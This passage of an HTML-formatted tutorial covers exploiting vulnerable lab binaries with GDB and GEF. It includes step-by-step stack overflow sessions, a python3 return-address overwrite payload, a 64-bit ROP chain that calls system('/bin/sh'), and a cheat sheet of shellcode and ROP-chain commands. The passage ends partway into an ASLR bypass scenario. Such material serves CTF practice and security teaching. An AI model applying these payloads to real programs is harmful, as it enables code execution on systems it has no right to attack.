style="color:#F8F8F2"><span class="token plain">gef‚û§ info functions</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ info variables</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Step 2: Static analysis</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ disassemble main</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ disassemble vulnerable_function</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ disassemble win</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Step 3: Dynamic analysis setup</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">break</span><span class="token plain"> main</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">break</span><span class="token plain"> vulnerable_function</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">break</span><span class="token plain"> *vulnerable_function+35  </span><span class="token comment" style="color:rgb(98, 114, 164)"># Before strcpy</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Step 4: Pattern generation and offset finding</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ pattern create </span><span class="token number">200</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ run </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">PATTERN</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ pattern search </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$eip</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ pattern offset </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">VALUE</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Step 5: Stack analysis</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ telescope </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$esp</span><span class="token plain"> </span><span class="token number">30</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ context stack</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ info frame</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Step 6: Exploitation</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ run </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$(</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">python3 </span><span class="token variable parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-c</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic"> </span><span class="token variable string" style="color:rgb(255, 121, 198);font-style:italic">&quot;print(&#x27;A&#x27;*76 + &#x27;</span><span class="token variable string entity" style="color:rgb(255, 121, 198);font-style:italic">\x69</span><span class="token variable string entity" style="color:rgb(255, 121, 198);font-style:italic">\x91</span><span class="token variable string entity" style="color:rgb(255, 121, 198);font-style:italic">\x04</span><span class="token variable string entity" style="color:rgb(255, 121, 198);font-style:italic">\x08</span><span class="token variable string" style="color:rgb(255, 121, 198);font-style:italic">&#x27;)&quot;</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Step 7: Verification</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ context</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ registers</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">continue</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="complete-64-bit-analysis-session">Complete 64-bit Analysis Session<a href="#complete-64-bit-analysis-session" class="hash-link" aria-label="Direct link to Complete 64-bit Analysis Session" title="Direct link to Complete 64-bit Analysis Session" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Start comprehensive analysis</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gdb </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-q</span><span class="token plain"> vuln64</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Step 1: Initial reconnaissance  </span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ </span><span class="token function" style="color:rgb(80, 250, 123)">file</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ checksec</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ info functions</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ vmmap</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Step 2: ROP gadget discovery</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ ropper </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--search</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;pop rdi&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ ropper </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--search</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;pop rsi&quot;</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ ropper </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--search</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;ret&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ ropper </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--search</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;syscall&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Step 3: Address enumeration</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ print get_flag</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ print system</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ search-pattern </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;/bin/sh&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Step 4: Dynamic analysis</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">break</span><span class="token plain"> vulnerable_function</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">break</span><span class="token plain"> *vulnerable_function+49  </span><span class="token comment" style="color:rgb(98, 114, 164)"># Before read()</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Step 5: Pattern analysis</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ pattern create </span><span class="token number">200</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ run</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># [Input pattern when prompted]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ pattern search </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rip</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ pattern offset </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">VALUE</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Step 6: Stack layout analysis</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ telescope </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rsp</span><span class="token plain"> </span><span class="token number">30</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ context stack</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ info frame</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Step 7: ROP chain construction</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ python</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">import</span><span class="token plain"> struct</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">payload </span><span class="token operator">=</span><span class="token plain"> b</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;A&#x27;</span><span class="token plain"> * </span><span class="token number">72</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">payload </span><span class="token operator">+=</span><span class="token plain"> struct.pack</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;&lt;Q&#x27;</span><span class="token plain">, 0x401273</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">      </span><span class="token comment" style="color:rgb(98, 114, 164)"># pop rdi; ret</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">payload </span><span class="token operator">+=</span><span class="token plain"> struct.pack</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;&lt;Q&#x27;</span><span class="token plain">, 0x7ffff7d74678</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token comment" style="color:rgb(98, 114, 164)"># &#x27;/bin/sh&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">payload </span><span class="token operator">+=</span><span class="token plain"> struct.pack</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;&lt;Q&#x27;</span><span class="token plain">, 0x401060</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">      </span><span class="token comment" style="color:rgb(98, 114, 164)"># system</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">with open</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;/tmp/rop.bin&#x27;</span><span class="token plain">, </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;wb&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> as f: f.write</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">end</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Step 8: Exploitation</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ run </span><span class="token operator">&lt;</span><span class="token plain"> /tmp/rop.bin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Step 9: Verification</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ context</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ registers</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ bt</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="advanced-gef-commands-for-exploitation">Advanced GEF Commands for Exploitation<a href="#advanced-gef-commands-for-exploitation" class="hash-link" aria-label="Direct link to Advanced GEF Commands for Exploitation" title="Direct link to Advanced GEF Commands for Exploitation" translate="no">‚Äã</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="memory-analysis-commands">Memory Analysis Commands<a href="#memory-analysis-commands" class="hash-link" aria-label="Direct link to Memory Analysis Commands" title="Direct link to Memory Analysis Commands" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Enhanced memory examination</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ telescope </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rsp</span><span class="token plain"> </span><span class="token number">50</span><span class="token plain">              </span><span class="token comment" style="color:rgb(98, 114, 164)"># Extended stack view</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ telescope </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rbp</span><span class="token plain">-0x50 </span><span class="token number">20</span><span class="token plain">         </span><span class="token comment" style="color:rgb(98, 114, 164)"># Buffer area analysis</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ hexdump byte </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rsp</span><span class="token plain"> </span><span class="token number">200</span><span class="token plain">          </span><span class="token comment" style="color:rgb(98, 114, 164)"># Raw memory dump</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ hexdump qword </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rsp</span><span class="token plain"> </span><span class="token number">20</span><span class="token plain">          </span><span class="token comment" style="color:rgb(98, 114, 164)"># Quad-word aligned dump</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Memory search and pattern matching</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ search-pattern </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;AAAA&quot;</span><span class="token plain">          </span><span class="token comment" style="color:rgb(98, 114, 164)"># Search for pattern</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ search-pattern 0x41414141      </span><span class="token comment" style="color:rgb(98, 114, 164)"># Search for hex value</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ </span><span class="token function" style="color:rgb(80, 250, 123)">grep</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;ret&quot;</span><span class="token plain"> </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rip</span><span class="token plain"> </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rip</span><span class="token plain">+1000      </span><span class="token comment" style="color:rgb(98, 114, 164)"># Search for instructions</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Memory modification for testing</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">set</span><span class="token plain"> *</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rsp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> 0x401179         </span><span class="token comment" style="color:rgb(98, 114, 164)"># Modify return address</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ patch qword </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rsp</span><span class="token plain"> 0x4011a5      </span><span class="token comment" style="color:rgb(98, 114, 164)"># Patch memory location</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ patch string 0x402000 </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;/bin/sh&quot;</span><span class="token plain"> </span><span class="token comment" style="color:rgb(98, 114, 164)"># Patch string value</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="control-flow-analysis">Control Flow Analysis<a href="#control-flow-analysis" class="hash-link" aria-label="Direct link to Control Flow Analysis" title="Direct link to Control Flow Analysis" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Breakpoint management</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">break</span><span class="token plain"> *0x401202                </span><span class="token comment" style="color:rgb(98, 114, 164)"># Instruction breakpoint</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">break</span><span class="token plain"> vulnerable_function </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rdi</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token number">100</span><span class="token plain"> </span><span class="token comment" style="color:rgb(98, 114, 164)"># Conditional breakpoint</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ </span><span class="token function" style="color:rgb(80, 250, 123)">watch</span><span class="token plain"> *</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rbp</span><span class="token plain">-0x50</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">             </span><span class="token comment" style="color:rgb(98, 114, 164)"># Watch buffer modification</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ awatch *0x404040               </span><span class="token comment" style="color:rgb(98, 114, 164)"># Access watchpoint</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Execution control</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ stepi </span><span class="token number">10</span><span class="token plain">                       </span><span class="token comment" style="color:rgb(98, 114, 164)"># Step 10 instructions</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ nexti </span><span class="token number">5</span><span class="token plain">                        </span><span class="token comment" style="color:rgb(98, 114, 164)"># Next 5 instructions</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ finish                         </span><span class="token comment" style="color:rgb(98, 114, 164)"># Execute until return</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">until</span><span class="token plain"> *0x401220                </span><span class="token comment" style="color:rgb(98, 114, 164)"># Execute until address</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Advanced control flow</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ jump *0x4011a5                 </span><span class="token comment" style="color:rgb(98, 114, 164)"># Jump to address</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ call get_flag</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">                </span><span class="token comment" style="color:rgb(98, 114, 164)"># Call function directly</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">return</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain">                       </span><span class="token comment" style="color:rgb(98, 114, 164)"># Force function return</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="exploitation-assistance-commands">Exploitation Assistance Commands<a href="#exploitation-assistance-commands" class="hash-link" aria-label="Direct link to Exploitation Assistance Commands" title="Direct link to Exploitation Assistance Commands" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Pattern and offset utilities</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ pattern create </span><span class="token number">1000</span><span class="token plain"> pattern.txt </span><span class="token comment" style="color:rgb(98, 114, 164)"># Create pattern to file</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ pattern search 0x6161616a      </span><span class="token comment" style="color:rgb(98, 114, 164)"># Search for pattern value</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ pattern offset 0x6261616161616162 </span><span class="token comment" style="color:rgb(98, 114, 164)"># Calculate offset</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># ROP chain utilities  </span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ ropper                         </span><span class="token comment" style="color:rgb(98, 114, 164)"># Interactive ROP search</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ ropper </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--search</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;pop rdi; ret&quot;</span><span class="token plain"> </span><span class="token comment" style="color:rgb(98, 114, 164)"># Specific gadget search</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ ropper </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--chain</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;execve&quot;</span><span class="token plain">        </span><span class="token comment" style="color:rgb(98, 114, 164)"># Automatic chain generation</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ rop                            </span><span class="token comment" style="color:rgb(98, 114, 164)"># Built-in ROP helper</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Shellcode assistance</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ shellcode search x86-64        </span><span class="token comment" style="color:rgb(98, 114, 164)"># Search shellcode database</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ shellcode get linux/x64/exec   </span><span class="token comment" style="color:rgb(98, 114, 164)"># Get specific shellcode</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ assemble </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;mov rax, 59&quot;</span><span class="token plain">         </span><span class="token comment" style="color:rgb(98, 114, 164)"># Assemble instruction</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ assemble </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rip</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;pop rdi; ret&quot;</span><span class="token plain">   </span><span class="token comment" style="color:rgb(98, 114, 164)"># Assemble at location</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="real-world-exploitation-scenarios">Real-World Exploitation Scenarios<a href="#real-world-exploitation-scenarios" class="hash-link" aria-label="Direct link to Real-World Exploitation Scenarios" title="Direct link to Real-World Exploitation Scenarios" translate="no">‚Äã</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="scenario-1-aslr-bypass-with-information-leak">Scenario 1: ASLR Bypass with Information Leak<a href="#scenario-1-aslr-bypass-with-information-leak" class="hash-link" aria-label="Direct link to Scenario 1: ASLR Bypass with Information Leak" title="Direct link to Scenario 1: ASLR Bypass with Information Leak" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># When ASLR is enabled, we need to leak addresses first</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ checksec</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Shows PIE enabled</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Look for format string or other info leak</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span 